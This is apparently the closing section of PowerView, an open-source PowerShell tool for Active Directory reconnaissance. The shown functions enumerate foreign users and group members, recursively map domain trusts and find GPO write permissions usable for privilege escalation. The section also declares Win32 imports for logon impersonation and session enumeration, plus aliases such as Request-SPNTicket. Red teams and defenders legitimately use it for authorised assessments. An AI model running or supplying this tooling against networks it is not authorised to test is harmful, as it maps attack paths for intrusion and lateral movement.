        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf('DC=')
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'

                    if ($GroupDomain -ne $UserDomain) {
                        # if the group domain doesn't match the user domain, display it
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {
<#
.SYNOPSIS

Enumerates groups with users outside of the group's domain and returns
each foreign member. This is a domain's "incoming" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainGroup  

.DESCRIPTION

Uses Get-DomainGroup to enumerate all groups for the current (or target) domain,
then enumerates the members of each group, and compares the member's domain
name to the parent group's domain name, outputting the member if the domains differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignGroupMember

Return all group members in the current domain where the group and member differ.

.EXAMPLE

Get-DomainForeignGroupMember -Domain dev.testlab.local

Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all group members in the dev.testlab.local domain where the member is
not in dev.testlab.local. binding to the secondary.dev.testlab.local for
queries, and using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignGroupMember

Custom PSObject with translated group member property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        # standard group names to ignore
        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')

        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                # filter for foreign SIDs in the cn field for users in another domain,
                #   or if the DN doesn't end with the proper DN for the queried domain
                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {
<#
.SYNOPSIS

This function enumerates all trusts for the current domain and then enumerates
all trusts for each domain it finds.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainTrust, Get-ForestTrust  

.DESCRIPTION

This function will enumerate domain trust relationships for the current domain using
a number of methods, and then enumerates all trusts for each found domain, recursively
mapping all reachable trust relationships. By default, and LDAP search using the filter
'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead. If any 

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the
built-in LDAP method.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -API | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using Win32 API calls and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -NET | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrustMapping -Server 'PRIMARY.testlab.local' | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using LDAP, binding to the PRIMARY.testlab.local server for queries
using the specified alternate credentials, and output everything to a .csv file.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    # keep track of domains seen so we don't hit infinite recursion
    $SeenDomains = @{}

    # our domain status tracker
    $Domains = New-Object System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }
    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }
    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }
    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }
    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }
    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }

    # get the current domain and push it onto the stack
    if ($PSBoundParameters['Credential']) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        # if we haven't seen this domain before
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

            # mark it as seen in our list
            $Null = $SeenDomains.Add($Domain, '')

            try {
                # get all the trusts for this domain
                $DomainTrustArguments['Domain'] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                # get any forest trusts, if they exist
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    # enumerate each trust found
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            # make sure we process the target
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}


function Get-GPODelegation {
<#
.SYNOPSIS

Finds users with write permissions on GPO objects which may allow privilege escalation within the domain.

Author: Itamar Mizrahi (@MrAnde7son)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER GPOName

The GPO display name to query for, wildcards accepted.

.PARAMETER PageSize

Specifies the PageSize to set for the LDAP searcher object.

.EXAMPLE

Get-GPODelegation

Returns all GPO delegations in current forest.

.EXAMPLE

Get-GPODelegation -GPOName

Returns all GPO delegations on a given GPO.
#>

    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = "Subtree"
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect.
# Warning: Once these are executed, they are baked in
# and can't be changed while the script is running!
#
########################################################

$Mod = New-InMemoryModule -ModuleName Win32

# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', Scope='Function', Target='psenum')]

# used to parse the 'samAccountType' property for users/computers/groups
$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

# used to parse the 'grouptype' property for groups
$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

# used to parse the 'userAccountControl' property for users/groups
$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# enum used by $WTS_SESSION_INFO_1 below
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# enum used by $LOCALGROUP_MEMBERS_INFO_2 below
$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# the NetLocalGroupEnum result structure
$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

# the NetLocalGroupGetMembers result structure
$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

# enums used in DS_DOMAIN_TRUSTS
$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# the DsEnumerateDomainTrusts result structure
$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# used by WNetAddConnection2W
$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
